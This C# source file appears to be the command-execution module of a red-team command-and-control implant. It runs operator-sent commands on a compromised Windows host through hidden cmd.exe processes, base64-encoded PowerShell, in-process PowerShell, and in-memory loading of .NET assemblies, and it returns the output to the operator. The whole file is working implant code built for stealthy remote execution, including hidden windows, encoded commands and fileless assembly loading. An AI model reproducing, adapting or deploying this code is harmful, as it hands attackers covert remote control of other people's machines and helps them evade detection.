using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Agent.Modules
{
    class ExecModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController agent, ConfigController config)
        {
            Agent = agent;
            Config = config;
        }

        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "exec",
                Description = "Execute things",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "shellcmd",
                        Description = "Execute a command via cmd.exe",
                        HelpText = "exec shellcmd [command] [args]",
                        CallBack = ExecuteShellCommand
                    },
                    new AgentCommand
                    {
                        Name = "shell",
                        Description = "Execute a command",
                        HelpText = "exec shell [command] [args]",
                        CallBack = ExecuteCommand
                    },
                    new AgentCommand
                    {
                        Name = "powershell",
                        Description = "Execute a PowerShell command via powershell.exe",
                        HelpText = "exec posh [cmdlet] [args]",
                        CallBack = ExecutePowerShell
                    },
                    new AgentCommand
                    {
                        Name = "powerpick",
                        Description = "Execute a PowerShell command via powershell.exe",
                        HelpText = "exec ppick [cmdlet] [args]",
                        CallBack = ExecutePowerPick
                    },
                    new AgentCommand
                    {
                        Name = "asm",
                        Description = "Execute a .NET assembly",
                        HelpText = "exec asm [path]",
                        CallBack = ExecuteAssembly
                    },
                    //new AgentCommand
                    //{
                    //    Name = "dll",
                    //    Description = "Map a native DLL into memory and call the specified exported function",
                    //    HelpText = "exec dll [path] [exported function] [args]",
                    //    CallBack = ExecuteNativeDll
                    //}
                }
            };
        }

        private void ExecuteShellCommand(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", arguments[0], string.Join(" ", arguments).Replace(arguments[0], ""));

                var cmd = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = @"C:\Windows\System32\cmd.exe",
                        Arguments = string.Format("/c {0}", args),
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    }
                };

                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteCommand(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');

                var cmd = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = arguments[0],
                        Arguments = string.Join(" ", arguments).Replace(arguments[0], ""),
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    }
                };

                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecutePowerShell(byte[] data)
        {
            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var args = string.Format("{0} {1}", arguments[0], string.Join(" ", arguments).Replace(arguments[0], ""));
                var enc = Convert.ToBase64String(Encoding.Unicode.GetBytes(args.ToString()));

                var cmd = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                        Arguments = string.Format("-enc {0}", enc),
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    }
                };

                cmd.Start();

                var stdout = cmd.StandardOutput.ReadToEnd();
                var stderr = cmd.StandardError.ReadToEnd();

                var result = new StringBuilder();
                result.Append(stdout);
                result.Append(stderr);

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecutePowerPick(byte[] data)
        {
            try
            {
                using (var runner = new PowerShellRunner())
                {
                    var result = runner.InvokePS(Encoding.UTF8.GetString(data));
                    if (!string.IsNullOrEmpty(result))
                    {
                        Agent.SendOutput(result);
                    }
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ExecuteAssembly(byte[] data)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var arguments = Encoding.UTF8.GetString(data).Split(' ');
                var asmBytes = Convert.FromBase64String(arguments[0]);

                var x = string.Join(" ", arguments);
                var y = x.Replace(arguments[0], string.Empty);
                var t = y.Trim();
                var z = t.Split(' ');

                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);
                asm.EntryPoint.Invoke(null, new object[] { z });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendOutput(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        private delegate string DllExport(string input);
    }
}